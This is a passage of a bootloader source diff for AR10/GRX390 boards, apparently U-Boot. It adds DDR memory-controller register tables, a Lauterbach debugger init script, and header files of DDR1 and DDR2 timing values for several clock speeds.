+   u32 value;
+}ddr_t;
+
+#ifndef CONFIG_GRX390_CPUFREQ_AUTO_DETECT
+ddr_t ddr[]={ { DDR_CCR00, MC_CCR00_VALUE },
+	            { DDR_CCR01, MC_CCR01_VALUE },
+              { DDR_CCR02, MC_CCR02_VALUE },
+              { DDR_CCR03, MC_CCR03_VALUE }, 
+              { DDR_CCR04, MC_CCR04_VALUE }, 
+              { DDR_CCR05, MC_CCR05_VALUE },
+              { DDR_CCR06, MC_CCR06_VALUE },
+              { DDR_CCR07, MC_CCR07_VALUE }, 
+              { DDR_CCR08, MC_CCR08_VALUE },
+              { DDR_CCR09, MC_CCR09_VALUE }, 
+              { DDR_CCR10, MC_CCR10_VALUE }, 
+              { DDR_CCR11, MC_CCR11_VALUE }, 
+              { DDR_CCR12, MC_CCR12_VALUE }, 
+              { DDR_CCR13, MC_CCR13_VALUE }, 
+              { DDR_CCR14, MC_CCR14_VALUE }, 
+              { DDR_CCR15, MC_CCR15_VALUE }, 
+              { DDR_CCR16, MC_CCR16_VALUE }, 
+              { DDR_CCR17, MC_CCR17_VALUE }, 
+              { DDR_CCR18, MC_CCR18_VALUE }, 
+              { DDR_CCR19, MC_CCR19_VALUE }, 
+              { DDR_CCR20, MC_CCR20_VALUE }, 
+              { DDR_CCR21, MC_CCR21_VALUE }, 
+              { DDR_CCR22, MC_CCR22_VALUE }, 
+              { DDR_CCR23, MC_CCR23_VALUE }, 
+              { DDR_CCR24, MC_CCR24_VALUE }, 
+              { DDR_CCR25, MC_CCR25_VALUE }, 
+              { DDR_CCR26, MC_CCR26_VALUE }, 
+              { DDR_CCR27, MC_CCR27_VALUE }, 
+              { DDR_CCR28, MC_CCR28_VALUE }, 
+              { DDR_CCR29, MC_CCR29_VALUE }, 
+              { DDR_CCR30, MC_CCR30_VALUE },
+              { DDR_CCR31, MC_CCR31_VALUE }, 
+              { DDR_CCR32, MC_CCR32_VALUE }, 
+              { DDR_CCR33, MC_CCR33_VALUE }, 
+              { DDR_CCR34, MC_CCR34_VALUE }, 
+              { DDR_CCR35, MC_CCR35_VALUE }, 
+              { DDR_CCR36, MC_CCR36_VALUE }, 
+              { DDR_CCR37, MC_CCR37_VALUE }, 
+              { DDR_CCR38, MC_CCR38_VALUE },
+              { DDR_CCR39, MC_CCR39_VALUE },
+              { DDR_CCR40, MC_CCR40_VALUE }, 
+              { DDR_CCR41, MC_CCR41_VALUE }, 
+              { DDR_CCR42, MC_CCR42_VALUE },
+              { DDR_CCR43, MC_CCR43_VALUE }, 
+              { DDR_CCR44, MC_CCR44_VALUE }, 
+              { DDR_CCR45, MC_CCR45_VALUE }, 
+              { DDR_CCR46, MC_CCR46_VALUE }, 
+              { DDR_CCR47, MC_CCR47_VALUE }, 
+              { DDR_CCR48, MC_CCR48_VALUE },
+              { DDR_CCR49, MC_CCR49_VALUE }, 
+              { DDR_CCR50, MC_CCR50_VALUE }, 
+              { DDR_CCR51, MC_CCR51_VALUE }, 
+              { DDR_CCR52, MC_CCR52_VALUE }, 
+              { DDR_CCR53, MC_CCR53_VALUE },
+              { DDR_CCR54, MC_CCR54_VALUE }, 
+              { DDR_CCR55, MC_CCR55_VALUE }, 
+              { DDR_PHYR0, MC_PHYR0_VALUE }, 
+              { DDR_PHYR1, MC_PHYR1_VALUE }, 
+              { DDR_PHYR2, MC_PHYR2_VALUE },
+              { DDR_PHYR3, MC_PHYR3_VALUE },
+              { DDR_PHYR4, MC_PHYR4_VALUE },
+              { DDR_PHYR5, MC_PHYR5_VALUE }, 
+              { DDR_PHYR6, MC_PHYR6_VALUE }, 
+              { DDR_PHYR7, MC_PHYR7_VALUE }, 
+              { DDR_PHYR8, MC_PHYR8_VALUE }, 
+              { DDR_PHYR9, MC_PHYR9_VALUE } };
+
+#else
+#define SET_DDR_VALUE(x)	\
+	ddr_t ddr_##x[] = {			\
+			  { DDR_CCR00, MC_CCR00_VALUE_##x },		\
+	          { DDR_CCR01, MC_CCR01_VALUE_##x }, 		\
+              { DDR_CCR02, MC_CCR02_VALUE_##x },		\
+              { DDR_CCR03, MC_CCR03_VALUE_##x }, 		\
+              { DDR_CCR04, MC_CCR04_VALUE_##x }, 		\
+              { DDR_CCR05, MC_CCR05_VALUE_##x },		\
+              { DDR_CCR06, MC_CCR06_VALUE_##x },		\
+              { DDR_CCR07, MC_CCR07_VALUE_##x }, 		\
+              { DDR_CCR08, MC_CCR08_VALUE_##x },		\
+              { DDR_CCR09, MC_CCR09_VALUE_##x }, 		\
+              { DDR_CCR10, MC_CCR10_VALUE_##x }, 		\
+              { DDR_CCR11, MC_CCR11_VALUE_##x }, 		\
+              { DDR_CCR12, MC_CCR12_VALUE_##x }, 		\
+              { DDR_CCR13, MC_CCR13_VALUE_##x }, 		\
+              { DDR_CCR14, MC_CCR14_VALUE_##x }, 		\
+              { DDR_CCR15, MC_CCR15_VALUE_##x }, 		\
+              { DDR_CCR16, MC_CCR16_VALUE_##x }, 		\
+              { DDR_CCR17, MC_CCR17_VALUE_##x }, 		\
+              { DDR_CCR18, MC_CCR18_VALUE_##x }, 		\
+              { DDR_CCR19, MC_CCR19_VALUE_##x }, 		\
+              { DDR_CCR20, MC_CCR20_VALUE_##x }, 		\
+              { DDR_CCR21, MC_CCR21_VALUE_##x }, 		\
+              { DDR_CCR22, MC_CCR22_VALUE_##x }, 		\
+              { DDR_CCR23, MC_CCR23_VALUE_##x }, 		\
+              { DDR_CCR24, MC_CCR24_VALUE_##x }, 		\
+              { DDR_CCR25, MC_CCR25_VALUE_##x }, 		\
+              { DDR_CCR26, MC_CCR26_VALUE_##x }, 		\
+              { DDR_CCR27, MC_CCR27_VALUE_##x }, 		\
+              { DDR_CCR28, MC_CCR28_VALUE_##x }, 		\
+              { DDR_CCR29, MC_CCR29_VALUE_##x }, 		\
+              { DDR_CCR30, MC_CCR30_VALUE_##x },		\
+              { DDR_CCR31, MC_CCR31_VALUE_##x }, 		\
+              { DDR_CCR32, MC_CCR32_VALUE_##x }, 		\
+              { DDR_CCR33, MC_CCR33_VALUE_##x }, 		\
+              { DDR_CCR34, MC_CCR34_VALUE_##x }, 		\
+              { DDR_CCR35, MC_CCR35_VALUE_##x }, 		\
+              { DDR_CCR36, MC_CCR36_VALUE_##x }, 		\
+              { DDR_CCR37, MC_CCR37_VALUE_##x }, 		\
+              { DDR_CCR38, MC_CCR38_VALUE_##x },		\
+              { DDR_CCR39, MC_CCR39_VALUE_##x },		\
+              { DDR_CCR40, MC_CCR40_VALUE_##x }, 		\
+              { DDR_CCR41, MC_CCR41_VALUE_##x }, 		\
+              { DDR_CCR42, MC_CCR42_VALUE_##x },		\
+              { DDR_CCR43, MC_CCR43_VALUE_##x }, 		\
+              { DDR_CCR44, MC_CCR44_VALUE_##x }, 		\
+              { DDR_CCR45, MC_CCR45_VALUE_##x }, 		\
+              { DDR_CCR46, MC_CCR46_VALUE_##x }, 		\
+              { DDR_CCR47, MC_CCR47_VALUE_##x }, 		\
+              { DDR_CCR48, MC_CCR48_VALUE_##x },		\
+              { DDR_CCR49, MC_CCR49_VALUE_##x }, 		\
+              { DDR_CCR50, MC_CCR50_VALUE_##x }, 		\
+              { DDR_CCR51, MC_CCR51_VALUE_##x }, 		\
+              { DDR_CCR52, MC_CCR52_VALUE_##x }, 		\
+              { DDR_CCR53, MC_CCR53_VALUE_##x },		\
+              { DDR_CCR54, MC_CCR54_VALUE_##x }, 		\
+              { DDR_CCR55, MC_CCR55_VALUE_##x }, 		\
+              { DDR_PHYR0, MC_PHYR0_VALUE_##x }, 		\
+              { DDR_PHYR1, MC_PHYR1_VALUE_##x }, 		\
+              { DDR_PHYR2, MC_PHYR2_VALUE_##x },		\
+              { DDR_PHYR3, MC_PHYR3_VALUE_##x },		\
+              { DDR_PHYR4, MC_PHYR4_VALUE_##x },		\
+              { DDR_PHYR5, MC_PHYR5_VALUE_##x }, 		\
+              { DDR_PHYR6, MC_PHYR6_VALUE_##x }, 		\
+              { DDR_PHYR7, MC_PHYR7_VALUE_##x }, 		\
+              { DDR_PHYR8, MC_PHYR8_VALUE_##x }, 		\
+              { DDR_PHYR9, MC_PHYR9_VALUE_##x } };		
+#endif /* CONFIG_GRX390_CPUFREQ_AUTO_DETECT */
+                
+                
+                
+                
+                
diff --git a/board/ar10/ddr1/16bit.cmm b/board/ar10/ddr1/16bit.cmm
new file mode 100644
--- /dev/null
+++ b/board/ar10/ddr1/16bit.cmm
@@ -0,0 +1,112 @@
+
+; Setup Lauterbach debugger for AR10
+;SYStem.mode down
+SYStem.cpu MIPS34k
+SYStem.JTAGCLOCK 10000000.
+SYSTEM.OPTION ENDIANESS BIG
+;SYStem.mode NoDebug
+;SYStem.mode Attach
+wait 1s
+;break
+
+; Setup AR10 CGU for 500/250
+;data.set 0xBF10300C %long 0x081  ; program the CPU/DDR speed
+data.set 0xBF10300C %long 0x192
+data.set 0xBF103010 %long 0x10020000     ; Program PPE frequency
+
+; CGU update
+data.set 0xBF103020 %long 0x01
+
+;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+;Initialize memory controller register
+;Pls refer to the documentation to change the necessary parameter to
+;Suit the DDR device you are using
+;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+;
+data.set 0xBF106c98 %long   0x94    ; interdcdc 1v8
+
+data.set 0xBF801000 %long	0x00000000 ; DDR1
+data.set 0xBF801010 %long	0x00000000
+data.set 0xBF801020 %long	0x0200c350  
+data.set 0xBF801030 %long	0x01010106
+data.set 0xBF801040 %long	0x020a0e03
+data.set 0xBF801050 %long	0x03030004 
+data.set 0xBF801060 %long	0x0000445c 
+data.set 0xBF801070 %long	0x01010001 
+data.set 0xBF801080 %long	0x00080404
+data.set 0xBF801090 %long	0x020000c8 
+data.set 0xBF8010A0 %long	0x0400000e 
+data.set 0xBF8010B0 %long	0x01000000 
+data.set 0xBF8010C0 %long	0x07990012 
+data.set 0xBF8010D0 %long	0x00010000 
+data.set 0xBF8010E0 %long	0x001300c8 
+data.set 0xBF8010F0 %long	0x01000000
+;
+data.set 0xBF801100 %long	0x00000000 ;Reg16
+data.set 0xBF801110 %long	0x00000000
+data.set 0xBF801120 %long	0x00000000
+data.set 0xBF801130 %long	0x00000100
+data.set 0xBF801140 %long	0x00000000 ;write mode register
+data.set 0xBF801150 %long	0x00003200 
+data.set 0xBF801160 %long	0x00000000 
+data.set 0xBF801170 %long	0x00000000
+data.set 0xBF801180 %long	0x00000032
+data.set 0xBF801190 %long	0x00000000
+data.set 0xBF8011A0 %long	0x00320000
+data.set 0xBF8011B0 %long	0x00000000
+data.set 0xBF8011C0 %long	0x00000000
+data.set 0xBF8011D0 %long	0x00000032
+data.set 0xBF8011E0 %long	0x00000000
+data.set 0xBF8011F0 %long	0x02000000 ; row=13
+;
+data.set 0xBF801200 %long	0xffff0a03 ;Reg32, col=9(x16),AP=10
+;data.set 0xBF801200 %long	0xffff0a02 ;Reg32, col=10(x8),AP=10
+
+data.set 0xBF801210 %long	0x01010101
+data.set 0xBF801220 %long	0x00010101
+
+data.set 0xBF801230 %long	0x00000001; cs0 active, 16-bit DDR
+;data.set 0xBF801230 %long	0x00000101; cs0 active, 8-bit DDR  
+
+data.set 0xBF801240 %long	0x00010000
+data.set 0xBF801250 %long	0x00000000
+data.set 0xBF801260 %long	0x00000000
+data.set 0xBF801270 %long	0x00000000
+data.set 0xBF801280 %long	0x00000000
+data.set 0xBF801290 %long	0x02020101
+data.set 0xBF8012A0 %long	0x08080404
+data.set 0xBF8012B0 %long	0x01000000
+data.set 0xBF8012C0 %long	0x01000201
+data.set 0xBF8012D0 %long	0x00000200
+data.set 0xBF8012E0 %long	0x00000000
+data.set 0xBF8012F0 %long	0x00000000 ;reg47, PHY_WRLAT=0
+;
+data.set 0xBF801300 %long	0x00000600 ; Reg 48 TDFI_PHY_RDLAT=6
+data.set 0xBF801310 %long	0x00079900
+data.set 0xBF801320 %long	0x02000200 
+data.set 0xBF801330 %long	0x02000200
+data.set 0xBF801340 %long	0x00000799
+data.set 0xBF801350 %long	0x000025fd
+data.set 0xBF801360 %long	0x00020103  ;WRLAT_ADJ=1, RDLAT_ADJ=3
+;data.set 0xBF801360 %long	0x00020000
+
+data.set 0xBF801370 %long	0x00000101
+;
+data.set 0xBF801400 %long	0x000f1000; DDR_PHY0;SSTL_2
+;
+data.set 0xBF801410 %long	0xf3014a37; slice0
+data.set 0xBF801420 %long	0x26c002c0; slice0
+data.set 0xBF801430 %long	0xf3014a37; slice1
+data.set 0xBF801440 %long	0x26c002c0; slice1
+
+;data.set 0xBF801450 %long	0x00000005;DFI_RD_V_E_DLY
+data.set 0xBF801450 %long	0x00000004;
+
+data.set 0xBF801460 %long	0x20092405;
+data.set 0xBF801470 %long	0x00092410;
+data.set 0xBF801480 %long	0x20092405;
+data.set 0xBF801490 %long	0x00092410;
+
+
+;Enable memory controller 	
+data.set 0xBF801000 %long	0x001
diff --git a/board/ar10/ddr1/16bit.conf b/board/ar10/ddr1/16bit.conf
new file mode 100755
--- /dev/null
+++ b/board/ar10/ddr1/16bit.conf
@@ -0,0 +1,68 @@
+0xBF106c98 0x00000094   
+0xBF801000 0x00000000 
+0xBF801010 0x00000000
+0xBF801020 0x0200c350 
+0xBF801030 0x01010106
+0xBF801040 0x020a0e03
+0xBF801050 0x03030004 
+0xBF801060 0x0000445c 
+0xBF801070 0x01010001 
+0xBF801080 0x00080404
+0xBF801090 0x020000c8 
+0xBF8010A0 0x0400000e 
+0xBF8010B0 0x01000000 
+0xBF8010C0 0x07990012 
+0xBF8010D0 0x00010000 
+0xBF8010E0 0x001300c8 
+0xBF8010F0 0x01000000
+0xBF801100 0x00000000 
+0xBF801110 0x00000000
+0xBF801120 0x00000000
+0xBF801130 0x00000100
+0xBF801140 0x00000000 
+0xBF801150 0x00003200 
+0xBF801160 0x00000000 
+0xBF801170 0x00000000
+0xBF801180 0x00000032
+0xBF801190 0x00000000
+0xBF8011A0 0x00320000
+0xBF8011B0 0x00000000
+0xBF8011C0 0x00000000
+0xBF8011D0 0x00000032
+0xBF8011E0 0x00000000
+0xBF8011F0 0x02000000 
+0xBF801200 0xffff0a03 
+0xBF801210 0x01010101
+0xBF801220 0x00010101
+0xBF801230 0x00000001
+0xBF801240 0x00010000
+0xBF801250 0x00000000
+0xBF801260 0x00000000
+0xBF801270 0x00000000
+0xBF801280 0x00000000
+0xBF801290 0x02020101
+0xBF8012A0 0x08080404
+0xBF8012B0 0x01000000
+0xBF8012C0 0x01000201
+0xBF8012D0 0x00000200
+0xBF8012E0 0x00000000
+0xBF8012F0 0x00000000 
+0xBF801300 0x00000600 
+0xBF801310 0x00079900
+0xBF801320 0x02000200 
+0xBF801330 0x02000200
+0xBF801340 0x00000799
+0xBF801350 0x000025fd
+0xBF801360 0x00020103 
+0xBF801370 0x00000101
+0xBF801400 0x000f1000
+0xBF801410 0xf3014a37
+0xBF801420 0x26c002c0
+0xBF801430 0xf3014a37
+0xBF801440 0x26c002c0
+0xBF801450 0x00000004
+0xBF801460 0x20092405
+0xBF801470 0x00092410
+0xBF801480 0x20092405
+0xBF801490 0x00092410
+0xBF801000 0x00000001
diff --git a/board/ar10/ddr1/8bit.conf b/board/ar10/ddr1/8bit.conf
new file mode 100755
--- /dev/null
+++ b/board/ar10/ddr1/8bit.conf
@@ -0,0 +1,68 @@
+0xBF106c98 0x00000094   
+0xBF801000 0x00000000 
+0xBF801010 0x00000000
+0xBF801020 0x0200c350 
+0xBF801030 0x01010106
+0xBF801040 0x020a0e03
+0xBF801050 0x03030004 
+0xBF801060 0x0000445c 
+0xBF801070 0x01010001 
+0xBF801080 0x00080404
+0xBF801090 0x020000c8 
+0xBF8010A0 0x0400000e 
+0xBF8010B0 0x01000000 
+0xBF8010C0 0x07990012 
+0xBF8010D0 0x00010000 
+0xBF8010E0 0x001300c8 
+0xBF8010F0 0x01000000
+0xBF801100 0x00000000 
+0xBF801110 0x00000000
+0xBF801120 0x00000000
+0xBF801130 0x00000100
+0xBF801140 0x00000000 
+0xBF801150 0x00003200 
+0xBF801160 0x00000000 
+0xBF801170 0x00000000
+0xBF801180 0x00000032
+0xBF801190 0x00000000
+0xBF8011A0 0x00320000
+0xBF8011B0 0x00000000
+0xBF8011C0 0x00000000
+0xBF8011D0 0x00000032
+0xBF8011E0 0x00000000
+0xBF8011F0 0x02000000 
+0xBF801200 0xffff0a02 
+0xBF801210 0x01010101
+0xBF801220 0x00010101
+0xBF801230 0x00000101
+0xBF801240 0x00010000
+0xBF801250 0x00000000
+0xBF801260 0x00000000
+0xBF801270 0x00000000
+0xBF801280 0x00000000
+0xBF801290 0x02020101
+0xBF8012A0 0x08080404
+0xBF8012B0 0x01000000
+0xBF8012C0 0x01000201
+0xBF8012D0 0x00000200
+0xBF8012E0 0x00000000
+0xBF8012F0 0x00000000 
+0xBF801300 0x00000600 
+0xBF801310 0x00079900
+0xBF801320 0x02000200 
+0xBF801330 0x02000200
+0xBF801340 0x00000799
+0xBF801350 0x000025fd
+0xBF801360 0x00020103 
+0xBF801370 0x00000101
+0xBF801400 0x000f1000
+0xBF801410 0xf3014a37
+0xBF801420 0x26c002c0
+0xBF801430 0xf3014a37
+0xBF801440 0x26c002c0
+0xBF801450 0x00000004
+0xBF801460 0x20092405
+0xBF801470 0x00092410
+0xBF801480 0x20092405
+0xBF801490 0x00092410
+0xBF801000 0x00000001
diff --git a/board/ar10/ddr1/xrx300_ddr1_250M_settings.h b/board/ar10/ddr1/xrx300_ddr1_250M_settings.h
new file mode 100755
--- /dev/null
+++ b/board/ar10/ddr1/xrx300_ddr1_250M_settings.h
@@ -0,0 +1,66 @@
+#define MC_CCR00_VALUE 	0x00000000	
+#define MC_CCR01_VALUE 	0x00000000
+#define MC_CCR02_VALUE 	0x0200c350  
+#define MC_CCR03_VALUE 	0x01010106
+#define MC_CCR04_VALUE 	0x020a0e03
+#define MC_CCR05_VALUE 	0x03030004 
+#define MC_CCR06_VALUE 	0x0000445c 
+#define MC_CCR07_VALUE 	0x01010001 
+#define MC_CCR08_VALUE 	0x00080404
+#define MC_CCR09_VALUE 	0x020000c8 
+#define MC_CCR10_VALUE 	0x0400000e 
+#define MC_CCR11_VALUE 	0x01000000 
+#define MC_CCR12_VALUE 	0x07990012 
+#define MC_CCR13_VALUE 	0x00010000 
+#define MC_CCR14_VALUE 	0x001300c8 
+#define MC_CCR15_VALUE 	0x01000000
+#define MC_CCR16_VALUE 	0x00000000 
+#define MC_CCR17_VALUE 	0x00000000
+#define MC_CCR18_VALUE 	0x00000000
+#define MC_CCR19_VALUE 	0x00000100
+#define MC_CCR20_VALUE 	0x00000000 
+#define MC_CCR21_VALUE 	0x00003200 
+#define MC_CCR22_VALUE 	0x00000000 
+#define MC_CCR23_VALUE 	0x00000000
+#define MC_CCR24_VALUE 	0x00000032
+#define MC_CCR25_VALUE 	0x00000000
+#define MC_CCR26_VALUE 	0x00320000
+#define MC_CCR27_VALUE 	0x00000000
+#define MC_CCR28_VALUE 	0x00000000
+#define MC_CCR29_VALUE 	0x00000032
+#define MC_CCR30_VALUE 	0x00000000
+#define MC_CCR31_VALUE 	0x02000000 
+#define MC_CCR32_VALUE 	0xffff0a03 
+#define MC_CCR33_VALUE 	0x01010101
+#define MC_CCR34_VALUE 	0x00010101
+#define MC_CCR35_VALUE 	0x00000001  
+#define MC_CCR36_VALUE 	0x00010000
+#define MC_CCR37_VALUE 	0x00000000
+#define MC_CCR38_VALUE 	0x00000000
+#define MC_CCR39_VALUE 	0x00000000
+#define MC_CCR40_VALUE 	0x00000000
+#define MC_CCR41_VALUE 	0x02020101
+#define MC_CCR42_VALUE 	0x08080404
+#define MC_CCR43_VALUE 	0x01000000
+#define MC_CCR44_VALUE 	0x01000201
+#define MC_CCR45_VALUE 	0x00000200
+#define MC_CCR46_VALUE 	0x00000000
+#define MC_CCR47_VALUE 	0x00000000 
+#define MC_CCR48_VALUE 	0x00000600 
+#define MC_CCR49_VALUE 	0x00079900
+#define MC_CCR50_VALUE 	0x02000200 
+#define MC_CCR51_VALUE 	0x02000200
+#define MC_CCR52_VALUE 	0x00000799
+#define MC_CCR53_VALUE 	0x000025fd
+#define MC_CCR54_VALUE 	0x00020103  
+#define MC_CCR55_VALUE 	0x00000101
+#define MC_PHYR0_VALUE 	0x000f1000
+#define MC_PHYR1_VALUE 	0xf3014a37
+#define MC_PHYR2_VALUE 	0x26c002c0
+#define MC_PHYR3_VALUE 	0xf3014a37
+#define MC_PHYR4_VALUE 	0x26c002c0
+#define MC_PHYR5_VALUE 	0x00000004
+#define MC_PHYR6_VALUE 	0x60092405
+#define MC_PHYR7_VALUE 	0x00092410
+#define MC_PHYR8_VALUE 	0x60092405
+#define MC_PHYR9_VALUE 	0x00092410
diff --git a/board/ar10/ddr1/xrx300_ddr1_8bit_250M_settings.h b/board/ar10/ddr1/xrx300_ddr1_8bit_250M_settings.h
new file mode 100755
--- /dev/null
+++ b/board/ar10/ddr1/xrx300_ddr1_8bit_250M_settings.h
@@ -0,0 +1,66 @@
+#define MC_CCR00_VALUE 	0x00000000	
+#define MC_CCR01_VALUE 	0x00000000
+#define MC_CCR02_VALUE 	0x0200c350  
+#define MC_CCR03_VALUE 	0x01010106
+#define MC_CCR04_VALUE 	0x020a0e03
+#define MC_CCR05_VALUE 	0x03030004 
+#define MC_CCR06_VALUE 	0x0000445c 
+#define MC_CCR07_VALUE 	0x01010001 
+#define MC_CCR08_VALUE 	0x00080404
+#define MC_CCR09_VALUE 	0x020000c8 
+#define MC_CCR10_VALUE 	0x0400000e 
+#define MC_CCR11_VALUE 	0x01000000 
+#define MC_CCR12_VALUE 	0x07990012 
+#define MC_CCR13_VALUE 	0x00010000 
+#define MC_CCR14_VALUE 	0x001300c8 
+#define MC_CCR15_VALUE 	0x01000000
+#define MC_CCR16_VALUE 	0x00000000 
+#define MC_CCR17_VALUE 	0x00000000
+#define MC_CCR18_VALUE 	0x00000000
+#define MC_CCR19_VALUE 	0x00000100
+#define MC_CCR20_VALUE 	0x00000000 
+#define MC_CCR21_VALUE 	0x00003200 
+#define MC_CCR22_VALUE 	0x00000000 
+#define MC_CCR23_VALUE 	0x00000000
+#define MC_CCR24_VALUE 	0x00000032
+#define MC_CCR25_VALUE 	0x00000000
+#define MC_CCR26_VALUE 	0x00320000
+#define MC_CCR27_VALUE 	0x00000000
+#define MC_CCR28_VALUE 	0x00000000
+#define MC_CCR29_VALUE 	0x00000032
+#define MC_CCR30_VALUE 	0x00000000
+#define MC_CCR31_VALUE 	0x02000000 
+#define MC_CCR32_VALUE 	0xffff0a02 
+#define MC_CCR33_VALUE 	0x01010101
+#define MC_CCR34_VALUE 	0x00010101
+#define MC_CCR35_VALUE 	0x00000101  
+#define MC_CCR36_VALUE 	0x00010000
+#define MC_CCR37_VALUE 	0x00000000
+#define MC_CCR38_VALUE 	0x00000000
+#define MC_CCR39_VALUE 	0x00000000
+#define MC_CCR40_VALUE 	0x00000000
+#define MC_CCR41_VALUE 	0x02020101
+#define MC_CCR42_VALUE 	0x08080404
+#define MC_CCR43_VALUE 	0x01000000
+#define MC_CCR44_VALUE 	0x01000201
+#define MC_CCR45_VALUE 	0x00000200
+#define MC_CCR46_VALUE 	0x00000000
+#define MC_CCR47_VALUE 	0x00000000 
+#define MC_CCR48_VALUE 	0x00000600 
+#define MC_CCR49_VALUE 	0x00079900
+#define MC_CCR50_VALUE 	0x02000200 
+#define MC_CCR51_VALUE 	0x02000200
+#define MC_CCR52_VALUE 	0x00000799
+#define MC_CCR53_VALUE 	0x000025fd
+#define MC_CCR54_VALUE 	0x00020103  
+#define MC_CCR55_VALUE 	0x00000101
+#define MC_PHYR0_VALUE 	0x000f1000
+#define MC_PHYR1_VALUE 	0xf3014a37
+#define MC_PHYR2_VALUE 	0x26c002c0
+#define MC_PHYR3_VALUE 	0xf3014a37
+#define MC_PHYR4_VALUE 	0x26c002c0
+#define MC_PHYR5_VALUE 	0x00000004
+#define MC_PHYR6_VALUE 	0x60092405
+#define MC_PHYR7_VALUE 	0x00092410
+#define MC_PHYR8_VALUE 	0x60092405
+#define MC_PHYR9_VALUE 	0x00092410
diff --git a/board/ar10/ddr2/grx390_ddr2_333M_settings.h b/board/ar10/ddr2/grx390_ddr2_333M_settings.h
new file mode 100755
--- /dev/null
+++ b/board/ar10/ddr2/grx390_ddr2_333M_settings.h
@@ -0,0 +1,66 @@
+#define MC_CCR00_VALUE 0x400
+#define MC_CCR01_VALUE 0x0
+#define MC_CCR02_VALUE 0x201046A
+#define MC_CCR03_VALUE 0x202040A
+#define MC_CCR04_VALUE 0x30E1404
+#define MC_CCR05_VALUE 0x3020305
+#define MC_CCR06_VALUE 0x3035B25
+#define MC_CCR07_VALUE 0x1010000
+#define MC_CCR08_VALUE 0xA0505
+#define MC_CCR09_VALUE 0x20000C8
+#define MC_CCR10_VALUE 0x400860F
+#define MC_CCR11_VALUE 0x1000000
+#define MC_CCR12_VALUE 0xA28002B
+#define MC_CCR13_VALUE 0x20000
+#define MC_CCR14_VALUE 0x2300C8
+#define MC_CCR15_VALUE 0x1000000
+#define MC_CCR16_VALUE 0x0
+#define MC_CCR17_VALUE 0x0
+#define MC_CCR18_VALUE 0x0
+#define MC_CCR19_VALUE 0x202
+#define MC_CCR20_VALUE 0x0
+#define MC_CCR21_VALUE 0x85200
+#define MC_CCR22_VALUE 0x4
+#define MC_CCR23_VALUE 0x0
+#define MC_CCR24_VALUE 0x40852
+#define MC_CCR25_VALUE 0x0
+#define MC_CCR26_VALUE 0x6420000
+#define MC_CCR27_VALUE 0x4
+#define MC_CCR28_VALUE 0x0
+#define MC_CCR29_VALUE 0x40642
+#define MC_CCR30_VALUE 0x0
+#define MC_CCR31_VALUE 0x2000000
+#define MC_CCR32_VALUE 0xf0f0A02
+#define MC_CCR33_VALUE 0x1010101
+#define MC_CCR34_VALUE 0x101
+#define MC_CCR35_VALUE 0x10001
+#define MC_CCR36_VALUE 0x10006
+#define MC_CCR37_VALUE 0x0
+#define MC_CCR38_VALUE 0x0
+#define MC_CCR39_VALUE 0x0
+#define MC_CCR40_VALUE 0x0
+#define MC_CCR41_VALUE 0x2000100
+#define MC_CCR42_VALUE 0x0
+#define MC_CCR43_VALUE 0x1010000
+#define MC_CCR44_VALUE 0x1020201
+#define MC_CCR45_VALUE 0x200
+#define MC_CCR46_VALUE 0x0
+#define MC_CCR47_VALUE 0x0
+#define MC_CCR48_VALUE 0x600
+#define MC_CCR49_VALUE 0x79900
+#define MC_CCR50_VALUE 0x2000200
+#define MC_CCR51_VALUE 0x2000200
+#define MC_CCR52_VALUE 0x799
+#define MC_CCR53_VALUE 0x25fd
+#define MC_CCR54_VALUE 0x20405
+#define MC_CCR55_VALUE 0x101
+#define MC_PHYR0_VALUE 0xf0100
+#define MC_PHYR1_VALUE 0xf4003827
+#define MC_PHYR2_VALUE 0x188002c0
+#define MC_PHYR3_VALUE 0xf4003827
+#define MC_PHYR4_VALUE 0x188002c0
+#define MC_PHYR5_VALUE 0x5
+#define MC_PHYR6_VALUE 0xc0092405
+#define MC_PHYR7_VALUE 0x92410
+#define MC_PHYR8_VALUE 0xc0092405
+#define MC_PHYR9_VALUE 0x92410
diff --git a/board/ar10/ddr2/grx390_ddr2_360M_settings.h b/board/ar10/ddr2/grx390_ddr2_360M_settings.h
new file mode 100755
--- /dev/null
+++ b/board/ar10/ddr2/grx390_ddr2_360M_settings.h
@@ -0,0 +1,135 @@
+#ifndef CONFIG_GRX390_CPUFREQ_AUTO_DETECT
+#define MC_CCR00_VALUE 0x400
+#define MC_CCR01_VALUE 0x0
+#define MC_CCR02_VALUE 0x201196F
+#define MC_CCR03_VALUE 0x202050C
+#define MC_CCR04_VALUE 0x3111604
+#define MC_CCR05_VALUE 0x3020306
+#define MC_CCR06_VALUE 0x303626C
+#define MC_CCR07_VALUE 0x1010000
+#define MC_CCR08_VALUE 0xC0606
+#define MC_CCR09_VALUE 0x20000C8
+#define MC_CCR10_VALUE 0x6009111
+#define MC_CCR11_VALUE 0x1000000
+#define MC_CCR12_VALUE 0xAF6002B
+#define MC_CCR13_VALUE 0x20000
+#define MC_CCR14_VALUE 0x2E00C8
+#define MC_CCR15_VALUE 0x1000000
+#define MC_CCR16_VALUE 0x0
+#define MC_CCR17_VALUE 0x0
+#define MC_CCR18_VALUE 0x0
+#define MC_CCR19_VALUE 0x202
+#define MC_CCR20_VALUE 0x0
+#define MC_CCR21_VALUE 0xA6200
+#define MC_CCR22_VALUE 0x4
+#define MC_CCR23_VALUE 0x0
+#define MC_CCR24_VALUE 0x40A62
+#define MC_CCR25_VALUE 0x0
+#define MC_CCR26_VALUE 0x6420000
+#define MC_CCR27_VALUE 0x4
+#define MC_CCR28_VALUE 0x0
+#define MC_CCR29_VALUE 0x40642
+#define MC_CCR30_VALUE 0x0
+#define MC_CCR31_VALUE 0x2000000
+#define MC_CCR32_VALUE 0xf0f0A02
+#define MC_CCR33_VALUE 0x1010101
+#define MC_CCR34_VALUE 0x101
+#define MC_CCR35_VALUE 0x10001
+#define MC_CCR36_VALUE 0x10006
+#define MC_CCR37_VALUE 0x0
+#define MC_CCR38_VALUE 0x0
+#define MC_CCR39_VALUE 0x0
+#define MC_CCR40_VALUE 0x0
+#define MC_CCR41_VALUE 0x2000100
+#define MC_CCR42_VALUE 0x0
+#define MC_CCR43_VALUE 0x1010000
+#define MC_CCR44_VALUE 0x1020201
+#define MC_CCR45_VALUE 0x200
+#define MC_CCR46_VALUE 0x0
+#define MC_CCR47_VALUE 0x0
+#define MC_CCR48_VALUE 0x600
+#define MC_CCR49_VALUE 0x79900
+#define MC_CCR50_VALUE 0x2000200
+#define MC_CCR51_VALUE 0x2000200
